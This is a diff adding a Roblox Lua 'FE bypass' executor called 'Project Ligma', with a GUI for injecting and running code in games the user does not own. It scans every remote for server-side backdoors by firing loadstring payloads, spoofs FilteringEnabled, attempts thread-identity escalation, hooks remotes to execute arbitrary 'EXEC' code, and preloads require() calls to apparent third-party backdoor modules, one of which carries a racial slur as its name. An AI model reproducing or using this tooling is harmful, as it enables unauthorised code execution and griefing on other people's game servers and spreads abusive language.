@@ -1,0 +1,603 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local EXE = Instance.new("TextButton")
+local CLEAR = Instance.new("TextButton")
+local INJECT = Instance.new("TextButton")
+local Frame_2 = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local ImageLabel = Instance.new("ImageLabel")
+local CLOSE = Instance.new("TextButton")
+local ImageButton = Instance.new("ImageButton")
+local InfoLabel = Instance.new("TextLabel")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Position = UDim2.new(0.28551212, 0, 0.268115938, 0)
+Frame.Size = UDim2.new(0, 820, 0, 384)
+Frame.Active = true
+Frame.Draggable = true
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.Position = UDim2.new(0.0121951215, 0, 0.0755208358, 0)
+TextBox.Size = UDim2.new(0, 574, 0, 346)
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.SourceSans
+TextBox.MultiLine = true
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 16.000
+TextBox.TextWrapped = true
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+EXE.Parent = Frame
+EXE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+EXE.BorderColor3 = Color3.fromRGB(0, 0, 0)
+EXE.Position = UDim2.new(0.713025033, 0, 0.0755208358, 0)
+EXE.Size = UDim2.new(0, 85, 0, 110)
+EXE.Font = Enum.Font.SourceSans
+EXE.Text = "EXE"
+EXE.TextColor3 = Color3.fromRGB(0, 0, 0)
+EXE.TextSize = 16.000
+
+INJECT.Parent = Frame
+INJECT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+INJECT.BorderColor3 = Color3.fromRGB(0, 0, 0)
+INJECT.Position = UDim2.new(0.713025033, 0, 0.32, 0)
+INJECT.Size = UDim2.new(0, 85, 0, 110)
+INJECT.Font = Enum.Font.SourceSans
+INJECT.Text = "INJECT"
+INJECT.TextColor3 = Color3.fromRGB(0, 0, 0)
+INJECT.TextSize = 16.000
+
+CLEAR.Parent = Frame
+CLEAR.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CLEAR.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CLEAR.Position = UDim2.new(0.713025033, 0, 0.57, 0)
+CLEAR.Size = UDim2.new(0, 85, 0, 110)
+CLEAR.Font = Enum.Font.SourceSans
+CLEAR.Text = "CLEAR"
+CLEAR.TextColor3 = Color3.fromRGB(0, 0, 0)
+CLEAR.TextSize = 16.000
+
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame_2.Position = UDim2.new(0.832501352, 0, 0.0755208358, 0)
+Frame_2.Size = UDim2.new(0, 128, 0, 346)
+Frame_2.ClipsDescendants = true
+
+local ScrollingFrame = Instance.new("ScrollingFrame")
+ScrollingFrame.Parent = Frame_2
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+ScrollingFrame.ScrollBarThickness = 8
+ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Parent = ScrollingFrame
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0, 2)
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local username = player.Name
+
+local requires = {
+"require(4513235536).G(\"\") -- gooner",
+"require(15267263357).V11(\""..username.."\")",
+"require(136507719733274):luacore(\""..username.."\")",
+"require(75834950186546).MorphMonster(\""..username.."\")",
+"require(110951620907921):Pload(\""..username.."\")",
+"require(132938459666886).stigma(\""..username.."\")",
+"require(4665394711).load(\""..username.."\")",
+"require(121425622240385).dominantultimate(\""..username.."\")",
+"require(11957419646):Fire(\""..username.."\", \"lua\")",
+"require(81657562726106).Guest1337(\""..username.."\")",
+"require(4488214340).s(\"/\")",
+"require(5433855038).bypass()",
+"require(10428).Morph(\""..username.."\")",
+"require(3426146934).Load(\""..username.."\")",
+"require(6664785060).O(\""..username.."\")",
+"require(5544057125).K(\""..username.."\")",
+"require(6591327458).Load(\""..username.."\")",
+"require(6347873199).E(\""..username.."\")",
+"require(6035422878).G(\""..username.."\")",
+"require(6006602543).L(\""..username.."\")",
+"require(5798741039).load(\""..username.."\")",
+"require(5793549963).load(\""..username.."\")",
+"require(4622803130).load(\""..username.."\")",
+"require(5938636766).load(\""..username.."\")",
+"require(5993609419).load(\""..username.."\")",
+"require(4426304330).s(\"/\")",
+"require(6437050595).D(\""..username.."\")",
+"require(5393344421).Load(\""..username.."\")",
+"require(6142993621).load(\""..username.."\")",
+"require(5862274942).Load(\""..username.."\")",
+"require(6640315201).F(\""..username.."\")",
+"require(5206141261).L(\""..username.."\")",
+"require(5552870548).NiggerDestroyer(\""..username.."\")",
+"require(5895141026).Load(\""..username.."\")",
+"require(6636761987).M(\""..username.."\")",
+"require(6151918201).Load(\""..username.."\")",
+"require(6525424059).Load(\""..username.."\")",
+"require(13457).Morph(\""..username.."\")",
+"require(13458).Morph(\""..username.."\")",
+"require(16553).Morph(\""..username.."\")",
+"require(16878).Morph(\""..username.."\")",
+"require(4785156244).load(\""..username.."\")",
+"require(5396248285).E(\""..username.."\")",
+"require(6701276769).E(\""..username.."\")",
+"require(6133540934).KILL(\""..username.."\")",
+"require(4616145761).load(\""..username.."\")",
+"require(6591620317).Load(\""..username.."\")",
+"require(4640894726).Load(\""..username.."\")",
+"require(654321).Load(\""..username.."\")",
+"require(6428357264).Load(\""..username.."\")",
+"require(5647589745).E(\""..username.."\")",
+"require(6395709582).E(\""..username.."\")",
+"require(6700398463).Load(\""..username.."\")",
+"require(6362286054).Load(\""..username.."\")",
+"require(6606820845).Load(\""..username.."\")",
+"require(6652396282).Load(\""..username.."\")",
+"require(6585592723).Load(\""..username.."\")",
+"require(6239416220).S(\""..username.."\")",
+"require(6202939751).Load(\""..username.."\")",
+"require(6571774264).Load(\""..username.."\")",
+"require(5321171187).E(\""..username.."\")",
+"require(5949694382).Load(\""..username.."\")",
+"require(6699397071).Load(\""..username.."\")",
+"require(6677595621).Load(\""..username.."\")",
+"require(6678736713).M(\""..username.."\")",
+"require(6731824945).Load(\""..username.."\")",
+"require(6744168316).Load(\""..username.."\")",
+"require(10889).Morph(\""..username.."\")",
+"require(10913).Morph(\""..username.."\")",
+"require(10914).Morph(\""..username.."\")",
+"require(3436957371):r6(\""..username.."\") -- R6 Converter",
+}
+
+for i = 1, #requires do
+    local RButton = Instance.new("TextButton")
+    RButton.Parent = ScrollingFrame
+    RButton.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
+    RButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+    RButton.Size = UDim2.new(1, -4, 0, 30)
+    RButton.Font = Enum.Font.SourceSans
+    RButton.Text = requires[i]
+    RButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+    RButton.TextSize = 10.000
+    RButton.TextWrapped = true
+    RButton.TextXAlignment = Enum.TextXAlignment.Left
+    
+    RButton.MouseButton1Click:Connect(function()
+        if TextBox.Text == "" then
+            TextBox.Text = RButton.Text
+        else
+            TextBox.Text = TextBox.Text .. "\n" .. RButton.Text
+        end
+    end)
+end
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.0398184434, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 93, 0, 29)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Project Ligma"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 16.000
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(0.0195121951, 0, 0.015625, 0)
+ImageLabel.Size = UDim2.new(0, 20, 0, 20)
+ImageLabel.Image = "rbxassetid://87162794"
+
+CLOSE.Parent = Frame
+CLOSE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CLOSE.BackgroundTransparency = 1.000
+CLOSE.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CLOSE.BorderSizePixel = 0
+CLOSE.Position = UDim2.new(0.9703421, 0, 0, 0)
+CLOSE.Size = UDim2.new(0, 24, 0, 24)
+CLOSE.Font = Enum.Font.SourceSans
+CLOSE.Text = "X"
+CLOSE.TextColor3 = Color3.fromRGB(0, 0, 0)
+CLOSE.TextSize = 16.000
+
+ImageButton.Parent = ScreenGui
+ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageButton.BackgroundTransparency = 1.000
+ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageButton.BorderSizePixel = 0
+ImageButton.Position = UDim2.new(0, 10, 1, -104)
+ImageButton.Size = UDim2.new(0, 74, 0, 74)
+ImageButton.Image = "rbxassetid://87162794"
+ImageButton.Visible = false
+
+InfoLabel.Parent = ScreenGui
+InfoLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+InfoLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+InfoLabel.BorderSizePixel = 1
+InfoLabel.Position = UDim2.new(0, 94, 1, -104)
+InfoLabel.Size = UDim2.new(0, 220, 0, 0)
+InfoLabel.Font = Enum.Font.SourceSans
+InfoLabel.Text = ""
+InfoLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+InfoLabel.TextSize = 14
+InfoLabel.TextWrapped = true
+InfoLabel.TextXAlignment = Enum.TextXAlignment.Left
+InfoLabel.Visible = false
+InfoLabel.AutomaticSize = Enum.AutomaticSize.Y
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local VirtualUser = game:GetService("VirtualUser")
+local StarterGui = game:GetService("StarterGui")
+local ScriptContext = game:GetService("ScriptContext")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+print("original made by harkinian_HAX")
+print("ported by zcel35")
+
+player.Idled:Connect(function()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
+end)
+
+local backdoor = nil
+local remotes = {}
+local infoVisible = false
+local injected = false
+
+local alphabet = {}
+for c = 65,90 do alphabet[#alphabet+1]=string.char(c) end
+for c = 97,122 do alphabet[#alphabet+1]=string.char(c) end
+
+local function generateName(l)
+    local n = ""
+    for i=1,l do
+        n = n .. alphabet[math.random(#alphabet)]
+    end
+    return n
+end
+
+local mt = getrawmetatable(game)
+if mt then
+    setreadonly(mt, false)
+    local oldIdx = mt.__index
+    mt.__index = function(t, k)
+        if k == "FilteringEnabled" then return false end
+        return oldIdx(t, k)
+    end
+    setreadonly(mt, true)
+    print("trying to fe bypass: FilteringDisabled")
+end
+
+RunService.Heartbeat:Connect(function() end)
+
+ImageButton.MouseButton1Click:Connect(function()
+    infoVisible = not infoVisible
+    InfoLabel.Visible = infoVisible
+end)
+
+local function animateLogo()
+    ImageButton.Visible = true
+    ImageButton.Position = UDim2.new(0.5, -47, 0.5, -47)
+    ImageButton.Size = UDim2.new(0, 94, 0, 94)
+    ImageButton.ImageTransparency = 0
+    
+    local pulseInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, 0, true)
+    local pulseTween = TweenService:Create(ImageButton, pulseInfo, {Size = UDim2.new(0, 110, 0, 110), Position = UDim2.new(0.5, -55, 0.5, -55)})
+    pulseTween:Play()
+    
+    task.wait(1)
+    
+    pulseTween:Cancel()
+    
+    local moveInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local moveTween = TweenService:Create(ImageButton, moveInfo, {
+        Position = UDim2.new(0, 10, 1, -104),
+        Size = UDim2.new(0, 74, 0, 74)
+    })
+    moveTween:Play()
+end
+
+local function searchBackdoor()
+    local special = ReplicatedStorage:FindFirstChild("lh"..game.PlaceId/6666*1337*game.PlaceId)
+    if special and (special:IsA("RemoteEvent") or special:IsA("RemoteFunction")) then
+        local code = generateName(15)
+        task.spawn(function()
+            pcall(function()
+                if special:IsA("RemoteFunction") then
+                    special:InvokeServer("bypass", "a=Instance.new('Model',workspace);a.Name='"..code.."'")
+                else
+                    special:FireServer("bypass", "a=Instance.new('Model',workspace);a.Name='"..code.."'")
+                end
+            end)
+        end)
+        remotes[code] = special
+        print("trying to fe bypass: "..special.Name.." testing")
+    end
+
+    for _,v in ipairs(game:GetDescendants()) do
+        if not v:IsA("RemoteEvent") and not v:IsA("RemoteFunction") then continue end
+        
+        local full = v:GetFullName()
+        if full:find("RobloxReplicatedStorage") or full:find("__FUNCTION") or full:find("DefaultChatSystem") then
+            print("trying to fe bypass: "..v.Name.." failed")
+            continue
+        end
+        
+        local code = generateName(15)
+        if v:IsA("RemoteEvent") then
+            v:FireServer("a=Instance.new('Model',workspace);a.Name='"..code.."'")
+        elseif v:IsA("RemoteFunction") then
+            task.spawn(function()
+                pcall(function()
+                    v:InvokeServer("a=Instance.new('Model',workspace);a.Name='"..code.."'")
+                end)
+            end)
+        end
+        remotes[code] = v
+        print("trying to fe bypass: "..v.Name.." testing")
+        task.wait()
+    end
+
+    for i=1,30 do
+        for c,rem in pairs(remotes) do
+            local m = workspace:FindFirstChild(c)
+            if m then
+                m:Destroy()
+                backdoor = rem
+                getgenv().NexusBackdoor = backdoor
+                print("trying to fe bypass: "..rem.Name.." successful")
+                return true
+            end
+        end
+        task.wait()
+    end
+    return false
+end
+
+local function backdoorRemotes()
+    print("trying RobloxScript bypass...")
+    
+    local actor = Instance.new("Actor")
+    actor.Parent = game
+    
+    local backdoorScript = Instance.new("LocalScript")
+    backdoorScript.Source = [[
+        pcall(function()
+            if setthreadidentity then setthreadidentity(7) end
+            if setidentity then setidentity(7) end
+        end)
+        
+        for _, v in ipairs(game:GetDescendants()) do
+            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+                if v:IsA("RemoteEvent") then
+                    local old = v.FireServer
+                    v.FireServer = function(self, ...)
+                        local args = {...}
+                        if type(args[1]) == "string" and args[1]:sub(1, 4) == "EXEC" then
+                            local code = args[1]:sub(5)
+                            local fn, err = loadstring(code)
+                            if fn then
+                                pcall(fn)
+                            end
+                            return nil
+                        end
+                        return old(self, unpack(args))
+                    end
+                else
+                    local old = v.InvokeServer
+                    v.InvokeServer = function(self, ...)
+                        local args = {...}
+                        if type(args[1]) == "string" and args[1]:sub(1, 4) == "EXEC" then
+                            local code = args[1]:sub(5)
+                            local fn, err = loadstring(code)
+                            if fn then
+                                pcall(fn)
+                            end
+                            return nil
+                        end
+                        return old(self, unpack(args))
+                    end
+                end
+                print("trying to fe bypass: " .. v.Name .. " fe bypassed")
+            end
+        end
+        
+        game.DescendantAdded:Connect(function(d)
+            if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
+                if d:IsA("RemoteEvent") then
+                    local old = d.FireServer
+                    d.FireServer = function(self, ...)
+                        local args = {...}
+                        if type(args[1]) == "string" and args[1]:sub(1, 4) == "EXEC" then
+                            local code = args[1]:sub(5)
+                            local fn, err = loadstring(code)
+                            if fn then
+                                pcall(fn)
+                            end
+                            return nil
+                        end
+                        return old(self, unpack(args))
+                    end
+                else
+                    local old = d.InvokeServer
+                    d.InvokeServer = function(self, ...)
+                        local args = {...}
+                        if type(args[1]) == "string" and args[1]:sub(1, 4) == "EXEC" then
+                            local code = args[1]:sub(5)
+                            local fn, err = loadstring(code)
+                            if fn then
+                                pcall(fn)
+                            end
+                            return nil
+                        end
+                        return old(self, unpack(args))
+                    end
+                end
+                print("trying to fe bypass: " .. d.Name .. " fe bypassed")
+            end
+        end)
+        
+        _G.BackdoorDone = true
+    ]]
+    
+    backdoorScript.Parent = actor
+    pcall(function() actor:Run(backdoorScript) end)
+    pcall(function() ScriptContext:AddCoreScriptLocal("CoreScripts/ProximityPrompt", actor) end)
+    
+    task.wait(2)
+    
+    return getgenv().BackdoorDone == true
+end
+
+-- ФУНКЦИИ ДЛЯ EXE (БЕЗ ПРИНТОВ)
+local function runRemote(remote, data)
+    if remote:IsA('RemoteEvent') then
+        remote:FireServer(data)
+    elseif remote:IsA('RemoteFunction') then
+        spawn(function() remote:InvokeServer(data) end)
+    end
+end
+
+local function executeRequire(line, backdoorRemote)
+    local processed = string.gsub(line, '%%username%%', player.Name)
+    
+    if processed:match("^require") then
+        if backdoorRemote then
+            runRemote(backdoorRemote, processed)
+            return true
+        end
+        
+        local fn = loadstring(processed)
+        if fn then
+            pcall(fn)
+            return true
+        end
+    end
+    
+    local fn = loadstring(processed)
+    if fn then
+        pcall(fn)
+        return true
+    end
+    return false
+end
+
+INJECT.MouseButton1Click:Connect(function()
+    if injected then return end
+    
+    game.StarterGui:SetCore("DevConsoleVisible", true)
+    print("INJECT: Starting injection")
+    
+    InfoLabel.Text = "original made by harkinian_HAX\nported by zcel35\nuse this internal executor for FE bypass\ninject status: injecting..."
+    infoVisible = true
+    InfoLabel.Visible = true
+    animateLogo()
+    
+    local found = searchBackdoor()
+    
+    if not found then
+        local backdoored = backdoorRemotes()
+        if backdoored then
+            found = searchBackdoor()
+        end
+    end
+    
+    if found then
+        injected = true
+        print("trying to fe bypass: connected")
+        InfoLabel.Text = "original made by harkinian_HAX\nported by zcel35\nuse this internal executor for FE bypass\ninject status: injected"
+    else
+        print("failed to fe bypass: no remote")
+        InfoLabel.Text = "original made by harkinian_HAX\nported by zcel35\nuse this internal executor for FE bypass\ninject status: not injected"
+    end
+end)
+
+-- КНОПКА EXE БЕЗ ПРИНТОВ
+EXE.MouseButton1Click:Connect(function()
+    local input = TextBox.Text
+    if input == "" then 
+        return 
+    end
+    
+    local lines = {}
+    for line in input:gmatch("[^\r\n]+") do
+        if line:match("^%s*$") == nil then
+            table.insert(lines, line)
+        end
+    end
+    
+    for _, line in ipairs(lines) do
+        if line and line ~= "" then
+            if line:match("^require") then
+                executeRequire(line, backdoor)
+            else
+                local fn = loadstring(line)
+                if fn then
+                    pcall(fn)
+                end
+            end
+        end
+    end
+end)
+
+CLEAR.MouseButton1Click:Connect(function()
+    TextBox.Text = ""
+    print("CLEAR: Done")
+end)
+
+CLOSE.MouseButton1Click:Connect(function()
+    Frame.Visible = false
+    print("CLOSE: Hidden")
+end)
+
+local Dragging = nil
+local DragStart = nil
+local StartPos = nil
+
+Frame.InputBegan:Connect(function(Input)
+    if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+        Dragging = true
+        DragStart = Input.Position
+        StartPos = Frame.Position
+        
+        Input.Changed:Connect(function()
+            if Input.UserInputState == Enum.UserInputState.End then
+                Dragging = false
+            end
+        end)
+    end
+end)
+
+Frame.InputChanged:Connect(function(Input)
+    if Input.UserInputType == Enum.UserInputType.MouseMovement and Dragging then
+        local Delta = Input.Position - DragStart
+        Frame.Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + Delta.X, StartPos.Y.Scale, StartPos.Y.Offset + Delta.Y)
+    end
+end)
